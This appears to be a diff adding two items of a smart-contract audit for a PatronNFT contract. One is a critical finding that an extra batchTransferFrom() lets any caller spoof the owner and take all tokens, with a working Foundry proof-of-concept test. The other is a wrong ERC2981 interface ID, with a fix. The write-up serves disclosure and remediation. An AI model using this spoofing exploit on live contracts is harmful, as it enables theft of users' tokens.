@@ -1,0 +1,110 @@
+<item>
+    <field name="topic">Spoofing</field>
+    <field name="impact">critical</field>
+    <field name="chance">high</field>
+    <field name="status">fixed</field>
+    <field name="commit">2b32fcf6de8c628ada25ee8dc1bef24555fdf01c</field>
+    <field name="content">
+      ## [C-1] Anyone can steal anyones Patron NFTs
+  
+      In [PatronNFT.sol](https://github.com/infinex-xyz/infinex-contracts/blob/7a0614f4fe5bbf92deb9a2dba9f01db226bad59d/src/patron/PatronNFT.sol), it inherits [ERC721A](https://github.com/chiru-labs/ERC721A/blob/338e327ae4abb18b3f1a37e364894625a6ea2778/contracts/ERC721A.sol) and its [ERC721ABatchTransferable](https://github.com/chiru-labs/ERC721A/blob/338e327ae4abb18b3f1a37e364894625a6ea2778/contracts/extensions/ERC721ABatchTransferable.sol) extension, which allows for efficient batch transfer of multiple sequential tokens. However, it also adds an additional [batchTransferFrom()](https://github.com/infinex-xyz/infinex-contracts/blob/7a0614f4fe5bbf92deb9a2dba9f01db226bad59d/src/patron/PatronNFT.sol#L71-L87) that differs from the [batchTransferFrom()](https://github.com/chiru-labs/ERC721A/blob/338e327ae4abb18b3f1a37e364894625a6ea2778/contracts/extensions/ERC721ABatchTransferable.sol#L16-L22) provided by the inherited ERC721ABatchTransferable extension. The key difference in PatronNFT’s version is the addition of the `by` parameter, which is intended to be to message sender when passed into the internal [_batchTransferFrom()](https://github.com/chiru-labs/ERC721A/blob/338e327ae4abb18b3f1a37e364894625a6ea2778/contracts/ERC721A.sol#L734) function, which is then used to see if the `by` address has permission to transfer the tokens.
+  
+      In allowing anyone to pass in any address for `by`, someone can pass in the actual owner, or an approved address for the tokens being transferred and effectively spoof as that address, allowing them to take anyones PatronNFT tokens.
+  
+      **Remediations to Consider**
+  
+      Remove the additional [batchTransferFrom()](https://github.com/infinex-xyz/infinex-contracts/blob/7a0614f4fe5bbf92deb9a2dba9f01db226bad59d/src/patron/PatronNFT.sol#L71-L87) function, since a proper functioning version is already inherited.
+  
+      - POC
+      
+          Add the following function to PatronNFT.t.sol, it showcases anyone can steal all nfts
+                
+              ```solidity
+              function test_canStealAllNfts() public {
+                  address attacker = vm.addr(0xDEAD);
+          
+                  // setup patron nft with same constructor args, recipient will get all nfts
+                  string memory name = "PatronNFT";
+                  string memory symbol = "PNFT";
+                  uint256 mintAmount = 100_000;
+                  uint96 royaltyFeeNumerator = 1000;
+                  uint256 saleAmount = 10_000; // should result in the royalty fee being the same as the numerator
+                  string memory baseTokenURI = "https://patronnft.com/";
+                  address royaltyReceiver;
+                  uint256 calculatedRoyaltyFee;
+                  patronNFT = new PatronNFT("PatronNFT", "PNFT", recipient, recipient, royaltyFeeNumerator, baseTokenURI);
+          
+                  assertEq(patronNFT.balanceOf(recipient), mintAmount);
+          
+                  uint256[] memory tokensToSteal = new uint256[](mintAmount);
+          
+                  for (uint256 i = 0; i < mintAmount; i++) {
+                      tokensToSteal[i] = i;
+                  }
+          
+                  //now the attack is that anyone can set the 'by' param in the batchTransferFrom function, which should actually be the message sender, so setting the owner of the nfts as by, you spoof being the owner
+          
+                  vm.prank(attacker);
+                  patronNFT.batchTransferFrom(recipient, recipient, attacker, tokensToSteal);
+          
+                  // attacker has stolen all nfts
+                  assertEq(patronNFT.balanceOf(attacker), mintAmount);
+                  assertEq(patronNFT.balanceOf(recipient), 0);
+              }
+              ```
+    </field>
+  </item>
+  
+  <item>
+    <field name="topic">TOSupport interfaceDO</field>
+    <field name="impact">high</field>
+    <field name="chance">medium</field>
+    <field name="status">fixed</field>
+    <field name="commit">55557b03f6cb7e7bdb059f4655de7baadaa5c865</field>
+    <field name="content">
+      ## [M-1] Patron NFT contract is not supporting ERC2981
+
+  
+      In `PatronNFT` contract, there’s `supportsInterface()` function, which attempts to support ERC2981 standard:
+  
+      ```solidity
+          function supportsInterface(bytes4 interfaceId) public view virtual override(ERC2981, ERC721A, IERC721A) returns (bool) {
+              // The interface IDs are constants representing the first 4 bytes
+              // of the XOR of all function selectors in the interface.
+              // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
+              // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
+              return interfaceId == 0x01ffc9a7 // ERC165 interface ID for ERC165.
+                  || interfaceId == 0x80ac58cd // ERC165 interface ID for ERC721.
+                  || interfaceId == 0x5b5e139f // ERC165 interface ID for ERC721Metadata.
+                  || interfaceId == type(ERC2981).interfaceId; // ERC165 interface ID for ERC2981.
+          }
+      ```
+  
+      **Reference:** [PatronNFT.sol#L134-L143](https://github.com/infinex-xyz/infinex-contracts/blob/7a0614f4fe5bbf92deb9a2dba9f01db226bad59d/src/patron/PatronNFT.sol#L134-L143)
+  
+      According to the [ERC2981 standard](https://eips.ethereum.org/EIPS/eip-2981), it only included `royaltyInfo()` function, which makes the standard’s `interfaceId` equal to `royaltyInfo.selector == 0x2a55205a`
+  
+      In PatronNFT, ERC2981 is imported from [OpenZeppelin library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/common/ERC2981.sol), which has its own `supportsInterface` function and is not defined in the ERC2981 standard, hence its `interfaceId` is equal to `royaltyInfo.selector ^ supportsInterface.selector == 0x2a55205a ^ 0x01ffc9a7 == 0x2baae9fd` 
+  
+      As a result, PatronNFT supports the wrong `interfaceId` 
+  
+      **Remediations to Consider**
+  
+      Properly support ERC2981 with `interfaceId` is `0x2a55205a`:
+  
+      ```diff
+          function supportsInterface(bytes4 interfaceId) public view virtual override(ERC2981, ERC721A, IERC721A) returns (bool) {
+              // The interface IDs are constants representing the first 4 bytes
+              // of the XOR of all function selectors in the interface.
+              // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
+              // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
+              return interfaceId == 0x01ffc9a7 // ERC165 interface ID for ERC165.
+                  || interfaceId == 0x80ac58cd // ERC165 interface ID for ERC721.
+                  || interfaceId == 0x5b5e139f // ERC165 interface ID for ERC721Metadata.
+      -           || interfaceId == type(ERC2981).interfaceId; // ERC165 interface ID for ERC2981.
+      +           || interfaceId == 0x2a55205a; // ERC165 interface ID for ERC2981.
+          }
+      ```
+    </field>
+  </item>
+  
